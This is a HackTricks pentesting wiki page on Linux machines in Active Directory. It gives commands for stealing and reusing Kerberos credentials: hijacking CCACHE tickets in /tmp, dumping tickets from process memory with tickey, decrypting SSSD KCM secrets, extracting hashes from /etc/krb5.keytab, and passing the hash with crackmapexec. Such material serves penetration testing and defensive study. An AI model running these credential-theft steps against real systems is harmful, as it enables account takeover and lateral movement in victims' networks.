# Linux Active Directory

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

{% embed url="https://websec.nl/" %}

A linux machine can also be present inside an Active Directory environment.

A linux machine in an AD might be **storing different CCACHE tickets inside files. This tickets can be used and abused as any other kerberos ticket**. In order to read this tickets you will need to be the user owner of the ticket or **root** inside the machine.

## Enumeration

### AD enumeration from linux

If you have access over an AD in linux (or bash in Windows) you can try [https://github.com/lefayjey/linWinPwn](https://github.com/lefayjey/linWinPwn) to enumerate the AD.

You can also check the following page to learn **other ways to enumerate AD from linux**:

{% content-ref url="../../network-services-pentesting/pentesting-ldap.md" %}
[pentesting-ldap.md](../../network-services-pentesting/pentesting-ldap.md)
{% endcontent-ref %}

### FreeIPA

FreeIPA is an open-source **alternative** to Microsoft Windows **Active Directory**, mainly for **Unix** environments. It combines a complete **LDAP directory** with an MIT **Kerberos** Key Distribution Center for management akin to Active Directory. Utilizing the Dogtag **Certificate System** for CA & RA certificate management, it supports **multi-factor** authentication, including smartcards. SSSD is integrated for Unix authentication processes. Learn more about it in:

{% content-ref url="../freeipa-pentesting.md" %}
[freeipa-pentesting.md](../freeipa-pentesting.md)
{% endcontent-ref %}

## Playing with tickets

### Pass The Ticket

In this page you are going to find different places were you could **find kerberos tickets inside a linux host**, in the following page you can learn how to transform this CCache tickets formats to Kirbi (the format you need to use in Windows) and also how to perform a PTT attack:

{% content-ref url="../../windows-hardening/active-directory-methodology/pass-the-ticket.md" %}
[pass-the-ticket.md](../../windows-hardening/active-directory-methodology/pass-the-ticket.md)
{% endcontent-ref %}

### CCACHE ticket reuse from /tmp

CCACHE files are binary formats for **storing Kerberos credentials** are typically stored with 600 permissions in `/tmp`. These files can be identified by their **name format, `krb5cc_%{uid}`,** correlating to the user's UID. For authentication ticket verification, the **environment variable `KRB5CCNAME`** should be set to the path of the desired ticket file, enabling its reuse.

List the current ticket used for authentication with `env | grep KRB5CCNAME`. The format is portable and the ticket can be **reused by setting the environment variable** with `export KRB5CCNAME=/tmp/ticket.ccache`. Kerberos ticket name format is `krb5cc_%{uid}` where uid is the user UID.

```bash
# Find tickets
ls /tmp/ | grep krb5cc
krb5cc_1000

# Prepare to use it
export KRB5CCNAME=/tmp/krb5cc_1000
```

### CCACHE ticket reuse from keyring

**Kerberos tickets stored in a process's memory can be extracted**, particularly when the machine's ptrace protection is disabled (`/proc/sys/kernel/yama/ptrace_scope`). A useful tool for this purpose is found at [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey), which facilitates the extraction by injecting into sessions and dumping tickets into `/tmp`.

To configure and use this tool, the steps below are followed:

```bash
git clone https://github.com/TarlogicSecurity/tickey
cd tickey/tickey
make CONF=Release
/tmp/tickey -i
```

This procedure will attempt to inject into various sessions, indicating success by storing extracted tickets in `/tmp` with a naming convention of `__krb_UID.ccache`.

### CCACHE ticket reuse from SSSD KCM

SSSD maintains a copy of the database at the path `/var/lib/sss/secrets/secrets.ldb`. The corresponding key is stored as a hidden file at the path `/var/lib/sss/secrets/.secrets.mkey`. By default, the key is only readable if you have **root** permissions.

Invoking \*\*`SSSDKCMExtractor` \*\* with the --database and --key parameters will parse the database and **decrypt the secrets**.

```bash
git clone https://github.com/fireeye/SSSDKCMExtractor
python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey
```

The **credential cache Kerberos blob can be converted into a usable Kerberos CCache** file that can be passed to Mimikatz/Rubeus.

### CCACHE ticket reuse from keytab

```bash
git clone https://github.com/its-a-feature/KeytabParser
python KeytabParser.py /etc/krb5.keytab
klist -k /etc/krb5.keytab
```

### Extract accounts from /etc/krb5.keytab

Service account keys, essential for services operating with root privileges, are securely stored in **`/etc/krb5.keytab`** files. These keys, akin to passwords for services, demand strict confidentiality.

To inspect the keytab file's contents, **`klist`** can be employed. The tool is designed to display key details, including the **NT Hash** for user authentication, particularly when the key type is identified as 23.

```bash
klist.exe -t -K -e -k FILE:C:/Path/to/your/krb5.keytab
# Output includes service principal details and the NT Hash
```

For Linux users, **`KeyTabExtract`** offers functionality to extract the RC4 HMAC hash, which can be leveraged for NTLM hash reuse.

```bash
python3 keytabextract.py krb5.keytab 
# Expected output varies based on hash availability
```

On macOS, **`bifrost`** serves as a tool for keytab file analysis.

```bash
./bifrost -action dump -source keytab -path /path/to/your/file
```

Utilizing the extracted account and hash information, connections to servers can be established using tools like **`crackmapexec`**.

```bash
crackmapexec 10.XXX.XXX.XXX -u 'ServiceAccount$' -H "HashPlaceholder" -d "YourDOMAIN"
```

## References

* [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
* [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#linux-active-directory](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#linux-active-directory)

{% embed url="https://websec.nl/" %}

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
